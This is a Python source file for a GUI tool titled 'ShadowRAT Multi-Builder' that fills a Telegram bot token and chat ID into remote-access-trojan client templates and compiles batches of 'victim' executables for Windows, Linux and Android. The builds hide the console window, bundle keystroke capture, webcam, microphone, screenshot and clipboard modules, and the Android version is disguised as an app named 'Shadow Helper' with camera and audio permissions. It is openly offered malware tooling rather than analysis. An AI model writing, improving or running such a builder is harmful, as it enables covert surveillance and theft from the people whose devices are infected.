
import os
import shutil
import random
import string
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox

# ===================== CONFIG =====================
TEMPLATE_WIN  = "client_windows.py"
TEMPLATE_LINUX = "client_linux.py"
TEMPLATE_AND  = "client_android.py"

OUTPUT_DIR = "victims"

class MultiBuilderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ShadowRAT Multi-Builder 🖤🔥")
        self.root.geometry("780x680")
        self.root.configure(bg="#0d0d0d")

        self.token_var    = tk.StringVar()
        self.chatid_var   = tk.StringVar()
        self.count_var    = tk.IntVar(value=1)
        self.platform_var = tk.StringVar(value="Windows")
        self.build_var    = tk.BooleanVar(value=True)

        self.create_widgets()

    def create_widgets(self):
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel",    background="#0d0d0d", foreground="#00ff41", font=("Consolas", 11))
        style.configure("TButton",   font=("Consolas", 11), background="#00ff41", foreground="black")
        style.configure("TEntry",    fieldbackground="#1a1a1a", foreground="#00ff41")
        style.configure("TCheckbutton", background="#0d0d0d", foreground="#00ff41")

        frame = ttk.Frame(self.root, padding=25)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="SHADOWRAT MULTI-PLATFORM BUILDER 2026", font=("Consolas", 18, "bold"), foreground="#ff0044").pack(pady=15)

        ttk.Label(frame, text="Telegram Bot Token:").pack(anchor="w")
        ttk.Entry(frame, textvariable=self.token_var, width=70).pack(pady=5)

        ttk.Label(frame, text="Allowed Chat ID:").pack(anchor="w")
        ttk.Entry(frame, textvariable=self.chatid_var, width=70).pack(pady=5)

        ttk.Label(frame, text="Platform:").pack(anchor="w")
        ttk.Combobox(frame, textvariable=self.platform_var, values=["Windows", "Linux", "Android"], state="readonly", width=67).pack(pady=5)

        ttk.Label(frame, text="Number of Victims:").pack(anchor="w")
        ttk.Spinbox(frame, from_=1, to=200, textvariable=self.count_var, width=10).pack(pady=5)

        ttk.Checkbutton(frame, text="Build executable (EXE / binary / APK)", variable=self.build_var).pack(pady=15)

        btn_frame = ttk.Frame(frame)
        btn_frame.pack(pady=20)

        ttk.Button(btn_frame, text="BUILD VICTIMS", command=self.build_victims).pack(side=tk.LEFT, padx=10)
        ttk.Button(btn_frame, text="EXIT", command=self.root.quit).pack(side=tk.LEFT, padx=10)

        self.status = tk.Text(frame, height=18, bg="#000000", fg="#00ff41", font=("Consolas", 10), insertbackground="#00ff41")
        self.status.pack(fill=tk.BOTH, expand=True, pady=10)

    def log(self, msg):
        self.status.insert(tk.END, msg + "\n")
        self.status.see(tk.END)
        self.root.update()

    def generate_hwid(self):
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

    def replace_config(self, content, token, chat_id, hwid):
        content = content.replace("YOUR_BOT_TOKEN_HERE", token.strip())
        content = content.replace("123456789", str(chat_id).strip())
        # HWID replacement depending on template format
        if "VICTIM_HWID =" in content:
            content = content.replace('VICTIM_HWID = generate_hwid()', f'VICTIM_HWID = "{hwid}"')
        return content

    def build_windows_victim(self, py_path, victim_id, hwid):
        exe_name = f"shadow_win_v{victim_id}_{hwid[:8]}"
        cmd = [
            "pyinstaller", "--onefile", "--noconsole", "--clean",
            "--hidden-import=telebot", "--hidden-import=pynput.keyboard._xorg",
            "--hidden-import=cryptography", "--hidden-import=psutil",
            "--hidden-import=pyautogui", "--hidden-import=cv2",
            "--hidden-import=sounddevice", "--hidden-import=soundfile",
            "--hidden-import=pyperclip", "--hidden-import=netifaces",
            "--name", exe_name, py_path
        ]
        self.log(f"Building Windows → {exe_name}.exe")
        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True)
            self.log(f"Success: dist/{exe_name}.exe")
        except subprocess.CalledProcessError as e:
            self.log(f"PyInstaller failed:\n{e.stderr}")

    def build_linux_victim(self, py_path, victim_id, hwid):
        bin_name = f"shadow_lin_v{victim_id}_{hwid[:8]}"
        cmd = [
            "pyinstaller", "--onefile", "--clean",
            "--hidden-import=telebot", "--hidden-import=pynput.keyboard._xorg",
            "--hidden-import=cryptography", "--hidden-import=psutil",
            "--hidden-import=pyautogui", "--hidden-import=cv2",
            "--hidden-import=sounddevice", "--hidden-import=soundfile",
            "--hidden-import=pyperclip", "--hidden-import=netifaces",
            "--hidden-import=paramiko",
            "--name", bin_name, py_path
        ]
        self.log(f"Building Linux binary → {bin_name}")
        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True)
            self.log(f"Success: dist/{bin_name}")
        except subprocess.CalledProcessError as e:
            self.log(f"PyInstaller failed:\n{e.stderr}")
        # Optional: make it executable
        if os.path.exists(f"dist/{bin_name}"):
            os.chmod(f"dist/{bin_name}", 0o755)

    def build_android_victim(self, py_path, victim_id, hwid):
        build_dir = f"android_build_v{victim_id}_{hwid[:8]}"
        os.makedirs(build_dir, exist_ok=True)
        shutil.copy(py_path, os.path.join(build_dir, "main.py"))

        spec = f"""
[app]
title = Shadow Helper
package.name = shadowhelper
package.domain = org.shadowrat
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

requirements = python3,kivy,pyjnius,telebot,pillow,requests,paramiko

android.permissions = INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,CAMERA,RECORD_AUDIO,FOREGROUND_SERVICE,VIBRATE

android.api = 33
android.minapi = 21
android.ndk_api = 21
"""

        with open(os.path.join(build_dir, "buildozer.spec"), "w", encoding="utf-8") as f:
            f.write(spec)

        self.log(f"Building Android APK v{victim_id} ... (this may take 5-15 min)")
        os.chdir(build_dir)
        try:
            result = subprocess.run("buildozer -v android debug", shell=True, check=True, capture_output=True, text=True)
            self.log("APK build success → bin/shadowhelper-1.0-debug.apk")
        except subprocess.CalledProcessError as e:
            self.log(f"Buildozer failed:\n{e.stderr}")
        finally:
            os.chdir("..")

    def build_victims(self):
        token = self.token_var.get().strip()
        try:
            chat_id = int(self.chatid_var.get().strip())
        except:
            messagebox.showerror("Error", "Chat ID must be integer")
            return

        count = self.count_var.get()
        platform = self.platform_var.get()
        do_build = self.build_var.get()

        if not token:
            messagebox.showerror("Error", "Enter Bot Token")
            return

        if platform == "Windows":
            template = TEMPLATE_WIN
        elif platform == "Linux":
            template = TEMPLATE_LINUX
        else:
            template = TEMPLATE_AND

        if not os.path.exists(template):
            messagebox.showerror("Error", f"Template missing: {template}")
            return

        with open(template, "r", encoding="utf-8") as f:
            template_content = f.read()

        os.makedirs(OUTPUT_DIR, exist_ok=True)

        for i in range(1, count + 1):
            hwid = self.generate_hwid()
            folder_name = f"{platform.lower()}_v{i}_{hwid[:8]}"
            folder = os.path.join(OUTPUT_DIR, folder_name)
            os.makedirs(folder, exist_ok=True)

            py_filename = "client.py" if platform != "Android" else "main.py"
            py_path = os.path.join(folder, py_filename)

            code = self.replace_config(template_content, token, chat_id, hwid)

            with open(py_path, "w", encoding="utf-8") as f:
                f.write(code)

            self.log(f"[+] {platform} Victim {i} generated")
            self.log(f"    HWID: {hwid}")
            self.log(f"    Folder: {folder}")

            if do_build:
                if platform == "Windows":
                    self.build_windows_victim(py_path, i, hwid)
                elif platform == "Linux":
                    self.build_linux_victim(py_path, i, hwid)
                else:
                    self.build_android_victim(py_path, i, hwid)

        self.log("\nGeneration complete. Victims in 'victims/' folder 🖤")

if __name__ == "__main__":
    root = tk.Tk()
    app = MultiBuilderGUI(root)
    root.mainloop()
